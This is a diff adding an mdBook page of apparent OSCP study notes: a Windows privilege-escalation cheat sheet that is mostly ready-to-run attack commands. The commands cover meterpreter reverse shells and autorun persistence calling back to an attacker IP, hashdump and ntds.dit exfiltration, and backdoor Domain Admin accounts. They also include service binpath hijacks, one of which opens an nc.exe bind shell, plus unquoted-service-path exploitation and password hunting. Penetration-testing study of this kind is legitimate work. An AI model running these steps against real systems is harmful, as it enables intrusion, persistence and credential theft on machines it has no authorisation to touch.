@@ -1,0 +1,539 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>S1REN&#x27;s Notes - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">2.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">2.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">2.3.</strong> File Transfer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="AddnlFileTrasnfer.html"><strong aria-hidden="true">2.3.1.</strong> Additional File Transfer</a></li></ol></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">2.4.</strong> Ports</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="SSHKeys.html"><strong aria-hidden="true">2.4.1.</strong> SSH Keys</a></li></ol></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">2.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">3.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Impacket.html"><strong aria-hidden="true">3.2.</strong> Impacket</a></li><li class="chapter-item expanded "><a href="RDPEXploit.html"><strong aria-hidden="true">3.3.</strong> RDP Exploits</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">3.4.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">3.5.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">3.5.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">3.5.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">3.6.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">3.7.</strong> File Uploads</a></li><li class="chapter-item expanded "><a href="AddnlFileUpload.html"><strong aria-hidden="true">3.8.</strong> Additional File Upload</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">3.8.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">3.8.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">3.8.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">3.9.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">3.10.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">3.11.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">3.12.</strong> SQL</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="PSQL.html"><strong aria-hidden="true">3.12.1.</strong> PSQL</a></li><li class="chapter-item expanded "><a href="MyMySql.html"><strong aria-hidden="true">3.12.2.</strong> MySQL</a></li><li class="chapter-item expanded "><a href="MSSQL.html"><strong aria-hidden="true">3.12.3.</strong> MSSQL</a></li></ol></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">3.13.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">3.14.</strong> XXE_XSS_Deserialization</a></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">3.15.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENLinNotes.html"><strong aria-hidden="true">4.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">5.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">5.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENWinNotes.html" class="active"><strong aria-hidden="true">5.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="KerberosCheetSheet.html"><strong aria-hidden="true">6.1.</strong> Kerberos Cheat Sheet</a></li><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">6.2.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">6.3.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">6.4.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">6.5.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">6.6.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">6.7.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">6.8.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p><strong>TL;DR</strong><br />
++ <strong>WHOAMI</strong>?<br />
+whoami<br />
++ <strong>CAN I DO SPECIAL THINGS</strong>?<br />
+WHOAMI /PRIV<br />
++ <strong>SERVICES</strong> <strong>--&gt;</strong> SERVICES AT BOOT <strong>&amp;</strong> SERVICES RAN THROUGH <strong>ICACLS</strong>.<strong>EXE</strong><br />
+wmic service get name,startname<br />
+NET START<br />
++ <strong>NETWORK</strong> <strong>CAPABILITIES?</strong> (CHECKS FOR 127)<br />
++ <strong>SHELL</strong> <strong>CAPABILITY</strong> <strong>--&gt;</strong> STAGED/NON-STAGED? FORMAT? ARCH? ENCODER? BIND/REVERSE?<br />
++ <strong>SHELL</strong> <strong>CAPABILITY</strong> <strong>--&gt;</strong> ENSURE CODE EXEC.<br />
++ <strong>NETWORK CAPABILITY.</strong><br />
+NETSTAT -ANOY<br />
++ <strong>NET USERS</strong> (LATERAL MOVEMENT CAPABILITIES?)<br />
+NET USERS<br />
+NET LOCALGROUP<br />
+NET USER <USERNAME> (AM I ADMIN? ANY SPECIAL GROUPS?)<br />
++ <strong>ADMIN CAPABILITY?</strong><br />
+NET LOCALGROUP ADMINISTRATORS<br />
++ <strong>PERMITTED TRAFFIC</strong> <strong>CAPABILITY</strong>???<br />
+netsh advfirewall firewall show rule name=<strong>all</strong><br />
+netsh advfirewall firewall show rule name=<strong>inbound</strong><br />
+netsh advfirewall firewall show rule name=<strong>outbounD</strong><br />
++ <strong>FILE TRANSFER CAPABILITY</strong>???<br />
+CERTUTIL?<br />
+FTP?<br />
+TFTP?<br />
+VB?<br />
+PS?<br />
+SMB?<br />
+NFS?<br />
++ <strong>ANY SCHEDULED TASKS I/O OPERATIONS</strong>?<br />
+C:\ &gt; schtasks /query /fo LIST /v &gt; schtasks.txt<br />
++ <strong>BINPATHS</strong>?<br />
+SC.EXE<br />
+[ <strong>+</strong> More to Come ]</p>
+<p><strong>Other Articles:</strong><br />
+<a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a><br />
+<a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a></p>
+<p>+ <strong>Pro-tip - To prevent your shell from hanging as a result of any of these commands, prefix them with this!</strong><br />
+cmd.exe /c <commands><br />
+cmd.exe /c start <commands></p>
+<p><strong>+ Pro-tip - Windows Powershell Execution Policy Bypass:</strong><br />
+PowerShell.exe -ExecutionPolicy UnRestricted -File .shell.ps1</p>
+<p>+ <strong>I just got shell on windows! What would S1REN do?</strong><br />
+<strong>--&gt;</strong> Get a meterpreter shell.<br />
+When it comes to a windows machine and receiving a low privilege shell - I do not mess around. I will always immediately work to maintain access and gain a more useful shell with meterpreter.<br />
+msfconsole<br />
+use exploit/multi/handler<br />
+set PAYLOAD windows/meterpreter/reverse_tcp<br />
+set LHOST <Attacking Machine IP><br />
+set LPORT <Listening Port></p>
+<p><strong>Maintaining Access with Meterpreter:</strong><br />
+<a href="https://www.offensive-security.com/metasploit-unleashed/maintaining-access/">https://www.offensive-security.com/metasploit-unleashed/maintaining-access/</a></p>
+<p><strong>meterpreter&gt;</strong> run persistence -U -i 5 -p 443 -r <Attacking Machine IP>
+<strong>[*]</strong> Creating a <strong>persistent</strong> agent: <strong>LHOST</strong>=<Attacking Machine IP> <strong>LPORT</strong>=443 (interval=5 onboot=true)
+<strong>[*]</strong> <strong>Persistent</strong> agent script is 613976 bytes long
+<strong>[*]</strong> Uploaded the <strong>persistent</strong> agent to <strong>C:\WINDOWS\TEMP\yyPSPPEn.vbs</strong>
+<strong>[*]</strong> Agent executed with <strong>PID 492</strong>
+<strong>[*]</strong> <strong>Installing</strong> <strong>into autorun</strong> as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
+<strong>[*]</strong> <strong>Installed</strong> <strong>into</strong> <strong>autorun</strong> as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
+<strong>[*]</strong> For <strong>cleanup</strong> use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
+<strong>meterpreter&gt;</strong>
+<strong>meterpreter&gt;</strong> <strong>reboot</strong>
+Rebooting...
+<strong>meterpreter&gt;</strong> <strong>exit</strong>
+<strong>meterpreter&gt;</strong> <strong>sysinfo</strong>
+Computer: XEN-XP-SP2-BARE
+OS      : Windows XP (Build 2600, Service Pack 2).
+Arch    : x86
+Language: en_US
+<strong>meterpreter&gt;</strong></p>
+<p>+ <strong>Forward out a <em>vulnerable</em> <em>service</em> with meterpreter.</strong><br />
+<strong>meterpreter&gt;</strong> portfwd add -l <Attacker PORT> -p <Victim PORT> -r <Victim IP><br />
+<strong>meterpreter&gt;</strong> portfwd add -l 3306 -p 3306 -r <Victim IP><br />
+<strong>$</strong> rdesktop 0.0.0.0</p>
+<p>+ <strong>Dude just do this with your meterpreter shell - trust S1REN.</strong><br />
+use exploit/windows/local/service_permissions</p>
+<p>+ <strong>Payloads</strong><br />
+<strong>--&gt;</strong> Checkbox target machine's <strong>file arch</strong> (x86, x64).<br />
+<strong>--&gt;</strong> Checkbox target machine for <em><strong>staged</strong></em> OR <em><strong>non-staged</strong></em> payloads..</p>
+<p>+ <strong>Execute a Powershell Script.</strong><br />
+powershell.exe 'C:\Tools*<em>privesc.ps1</em>*'</p>
+<p>+ <strong>I need to enumerate out the System Information.</strong><br />
+<em><strong>Save this info</strong></em> - it can be utilized with other windows privesc checking tools (based on installed patches, OS Versioning, etc)<br />
+systeminfo</p>
+<p>+ <strong>Who am I?</strong><br />
+whoami<br />
+echo %username%</p>
+<p>+ <strong>Privileges</strong><br />
+whoami /priv</p>
+<p>+ <strong>List out all NT AUTHORITY/SYSTEM Services.</strong><br />
+wmic service get name,startname |FINDSTR "NT"</p>
+<p>+ <strong>Print Nightmare?</strong><br />
+whoami /priv<br />
+SetImpersonatePrivilege Enabled? 🙂</p>
+<p>+ <strong>Domain Box?</strong><br />
+Bloodhound? Sharphound?</p>
+<p>+ <strong>Can we Install Things <em>Elevated</em>?</strong><br />
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br />
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br />
+[Installing Elevated]<br />
+msiexec /i <path to msi file></p>
+<p>+ <strong>Some Domains.xml Abuse.</strong><br />
+<a href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a></p>
+<p>+ <strong>Will the path to privilege escalation lie in a executable binary or service in Program Files? Is it listening on local only and thus we missed it from the outside scans?</strong><br />
+cd "C:\Program Files"<br />
+DIR /A /O /Q</p>
+<p>cd "C:\Program Files (x86)"<br />
+DIR /A /O /Q</p>
+<p>+ <strong>What is my current user's privileges?</strong><br />
+net user someWindowsUser</p>
+<p>+ <strong>What are other user's privileges?</strong><br />
+net users</p>
+<p>+ <strong>Hash Collection:</strong><br />
+<strong>pg_dump</strong>.exemeterpreter &gt; <strong>hashdump</strong></p>
+<p>**ntds.dit exfiltration.<br />
+**<br />
++ <strong>Who's the Administrator(s) around here?</strong><br />
+net localgroup administrators</p>
+<p>+ <strong>Might we be able to move laterally to them if they are Administrators?</strong><br />
+net user somePotentialAdminUser</p>
+<p>+ <strong>Firewall Information?</strong><br />
+netsh firewall show state<br />
+netsh firewall show config</p>
+<p>+ <strong>Network Information</strong> (<em>who am I connected to? can anything off of Loopback be forwarded out to 0.0.0.0?</em>)<br />
+netstat -anoy<br />
+route print<br />
+arp -A<br />
+ipconfig /all</p>
+<p>+ <strong>Cleartext Passwords in Files? Search for them.</strong><br />
+findstr /si password *.txt<br />
+findstr /si password *.xml<br />
+findstr /si password *.ini</p>
+<p>+ <strong>Find all those password and credential strings in config files.</strong><br />
+dir /s <em>pass</em> == <em>cred</em> == <em>vnc</em> == <em>.config</em></p>
+<p>+ <strong>Find all passwords in all files...</strong><br />
+findstr /spin "password" <em>.</em></p>
+<p>+ <strong>WINDOWS SHARES.</strong><br />
+NET SHARE<br />
+NET USE</p>
+<p><strong>--&gt; CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:</strong><br />
+NET SHARE <sharename>=&lt;drive/folderpath&gt; /remark: "This is my share."<br />
+<strong>--&gt; MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:</strong><br />
+NET USE Z: \COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES<br />
+<strong>--&gt;</strong> <strong>UNMOUNT SHARE:</strong><br />
+NET USE Z: /DELETE<br />
+<strong>--&gt;</strong> <strong>DELETE A SHARE ENTIRLEY:</strong><br />
+NET SHARE /DELETE</p>
+<p>+ <strong>Find ALL weak file permissions per drive.</strong><br />
+accesschk.exe -uwqs Users c:<em>.</em></p>
+<p>+ <strong>A part of group "Authenticated Users" - you would be surprised if you have a real user.</strong><br />
+accesschk.exe -uwqs "Authenticated Users" c:<em>.</em></p>
+<p>+ <strong>Add an Administrator User with all of the goodies.</strong><br />
+cmd.exe /c net user siren superPassword /add<br />
+cmd.exe /c net localgroup administrators siren /add<br />
+cmd.exe /c net localgroup "Remote Desktop Users" siren /add</p>
+<p>+ <strong>Adding a Windows Domain Administrator from the Command Line:</strong><br />
+cmd.exe /c net user siren superPassword /add<br />
+net localgroup Administrators siren /ADD /DOMAIN<br />
+net localgroup "Remote Desktop Users" siren /ADD /DOMAIN<br />
+net group "Domain Admins" siren /ADD /DOMAIN<br />
+net group "Enterprise Admins" siren /ADD /DOMAIN<br />
+net group "Schema Admins" siren /ADD /DOMAIN<br />
+net group "Group Policy Creator Owners" siren /ADD /DOMAIN</p>
+<p>+ <strong>Time and our own <em>Scheduled Tasks</em>.</strong><br />
+time<br />
+The current time is: 6:41:05.81<br />
+at 06:42 /interactive "C:\Tools\sirenMaint.exe"</p>
+<p>+ <strong>Create a Task. Run as System. Every 5 minutes. Path to binary.</strong><br />
+schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr ""C:\Tools\sirenMaint.exe""<br />
+<strong>Attacking Machine:</strong><br />
+nc -lvp 443<br />
+<strong>Victim Machine:</strong><br />
+schtasks /RUN /TN "RUNME"</p>
+<p>+ <strong>Fun with Accesschk Enumeration!</strong><br />
+accesschk.exe /accepteula (<em>always do this first!!!!!</em>)<br />
+accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)<br />
+accesschk.exe -uwcqv "Authenticated Users" * (<em>won't yield anything on Win 8</em>)<br />
+accesschk.exe -ucqv [service_name]</p>
+<p><strong>#Find ALL weak folder permissions, per drive.</strong><br />
+accesschk.exe -uwdqs Users c:\<br />
+accesschk.exe -uwdqs "Authenticated Users" c:\<br />
+accesschk.exe -uwqs Users c:<em>.</em><br />
+accesschk.exe -uwqs "Authenticated Users" c:<em>.</em></p>
+<p>+ <strong>Let me guess, you came in as NT AUTHORITY\NETWORK SERVICE</strong> <strong>?</strong><br />
+MS09-012.exe "whoami"<br />
+Initiate Network-Related Transfer <em>Again</em>.<br />
+MS09-012.exe "ftp -v -n -s:ftp.txt" and come back in NT Shell.</p>
+<p>+ <strong>I enumerated a weak service path on the machine. How do I exploit this... S1REN?</strong><br />
+sc config UPNPHOST binpath= "C:\Tools\sirenMaint.exe"<br />
+sc config UPNPHOST obj= ".\LocalSystem" password= ""<br />
+sc config SSDPSRV binpath= "C:\inetpub\siren\sirenMaint.exe"<br />
+sc config SSDPSRV obj= ".\LocalSystem" password= ""<br />
+sc config SSDPSRV start= "demand"<br />
+(<em>Now, Stage matching msfvenom Payload Listener in Meterpreter</em>)<br />
+net stop SSDPSRV<br />
+net start SSDPSRV</p>
+<p>+ <strong>Up to Vista...</strong><br />
+psexec -i -s cmd.exe</p>
+<p>+ <strong>On Windows XP and Older we can get an Administrator Privilege shell.</strong></p>
+<p><em><strong>--&gt;</strong></em> IF you have a GUI with a USER THAT IS INCLUDED IN THE Administrators GROUP you first<br />
+need to open up cmd.exe for the administrator. If you open up the cmd that is in<br />
+Accessories it will be opened up as a normal user. And if you rightclick and do<br />
+Run as Administrator you might need to know the Administrators password. Which<br />
+you might not know. So instead you open up the cmd from C:\windows\system32\cmd.exe.<br />
+This will give you a cmd with <em>Administrators Rights</em>.</p>
+<p><strong>--&gt;</strong> <em>From here, we want SYSTEM level privileges, no?</em><br />
+<strong>--&gt;</strong> First we check what time it is on the local machine.<br />
+time<br />
+<strong>--&gt;</strong> Now we set the time we want the system CMD to start.<br />
+<strong>--&gt;</strong> Probably one minuter after the time.<br />
+at 01:23 /interactive cmd.exe<br />
+<strong>System Shell.</strong></p>
+<p>+ <strong>Ahh, so you're interested in UNQUOTED SERVICE PATHS... eh?</strong><br />
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows" |findstr /i /v """</p>
+<p><strong>--&gt;</strong> Using SC:<br />
+sc query<br />
+sc qc <service name></p>
+<p><em><strong>--&gt;</strong></em> Okay S1REN, what am I looking for here?<br />
+If the results of the above command's value of path only contains "" and spaces - it's vulnerable.</p>
+<p><em><strong>--&gt;</strong></em> Have a hit?<br />
+<em><strong>--&gt;</strong></em> Use icacls or cacls.exe (both native to Windows) to check binary permissions.<br />
+icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"</p>
+<p><em><strong>--&gt;</strong></em> <em>Exploit it.</em><br />
+<em><strong>--&gt;</strong></em> <em>If the path of the Binary file is:</em><br />
+C:\Program Files\something\something.exe<br />
+<em><strong>--&gt;</strong></em> <em>Then,</em><br />
+move something.exe something.exe.BACK<br />
+move sirenMaint.exe C:\Program Files\something\<br />
+move sirenMaint.exe something.exe</p>
+<p><em><strong>--&gt;</strong></em> Well, wasn't that fun? Now our payload will get executed instead of the intended exe!<br />
+<em><strong>--&gt;</strong></em> <em>Nice.</em></p>
+<p><strong>#S1REN, is there a better way to enumerate out every service and then just check for which of them has an Unquoted Bin Paths?<br />
+<strong>_</strong>--&gt;</strong> Yup._<br />
+<strong>--&gt;</strong> <em>Thanks S1REN!</em><br />
+cd "C:\Windows\TEMP"<br />
+sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; ServiceNames.txt<br />
+FOR /F %i in (ServiceNames.txt) DO echo %i<br />
+type ServiceNames.txt<br />
+FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i &gt;&gt; Services.txt<br />
+FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt<br />
+type path.txt</p>
+<p><em>Nice.</em></p>
+<p><strong>#Continued</strong><br />
+<strong>--&gt;</strong> S1REN.<br />
+<strong>--&gt;</strong> Yes?<br />
+<strong>--&gt;</strong> Is there a way to do essentially the same thing and then recursively execute icacls.exe or cacls.exe on them to get the information I need?<br />
+<strong>--&gt;</strong> Yup.<br />
+cd "C:\Windows\TEMP"<br />
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; C:\windows\temp\permissions.txt</p>
+<p><strong>icacls.exe:</strong><br />
+for /f eol^=^"^ delims^=^" %a in (C:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"</p>
+<p><strong>cacls.exe</strong><br />
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c cacls "%a"</p>
+<p>IF YOU FIND A SERVICE THAT HAS WRITE PERMISSIONS set to "EVERYONE", you can change<br />
+that binary INTO YOUR OWN CUSTOM BINARY and make it execute in the privileged context.</p>
+<p>+ <strong>Dealing with Scheduled Tasks with SYSTEM Privileges.</strong><br />
+<strong>--&gt;</strong> Here we are looking for tasks that are run by a privileged user, and run a binary<br />
+that we can overwrite.<br />
+schtasks /query /fo LIST /v &gt; schtask.txt<br />
+type schtask.txt<br />
+(Copy that output to a temporary file</p>
+<p><strong>--&gt;</strong> Yeah I know this ain't pretty, but it works. You can of course change the name<br />
+SYSTEM to another privileged user. In other words, copy the output into Kali and<br />
+just grep for SYSTEM.<br />
+<strong>--&gt;</strong> Nice, S1REN.<br />
+<strong>--&gt;</strong> Thanks.<br />
+cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM --color=auto</p>
+<p><strong>--&gt;</strong> <strong>Now, Change up the UPNP Service Binary Path (for example):</strong><br />
+sc config upnphost binpath= "C:\Tools\nc.exe -nlvp 6666 -e C:\Windows\system32\cmd.exe"<br />
+sc config upnphost obj= ".\LocalSystem" password= ""<br />
+sc config upnphost depend= ""<br />
+net stop <service><br />
+<strong>--&gt;</strong> Attacking Machine<br />
+nc -nlvp 6666<br />
+net start <service></p>
+<p><strong>Tools:</strong><br />
+(Remember how I said to save a local copy of that systeminfo output?)<br />
+<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
+<p>+ <strong>How do I cross-compile payloads for Windows on Linux, S1REN?</strong><br />
+<strong>--&gt;</strong> Dude, <em>check this out</em>.<br />
+apt-get install mingw-w64</p>
+<p><strong>+ Cross-Compilation Reference:</strong></p>
+<ul>
+<li>Ci686-w64-mingw32-gcc hello.c -o hello32.exe     </li>
+<li>32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe    </li>
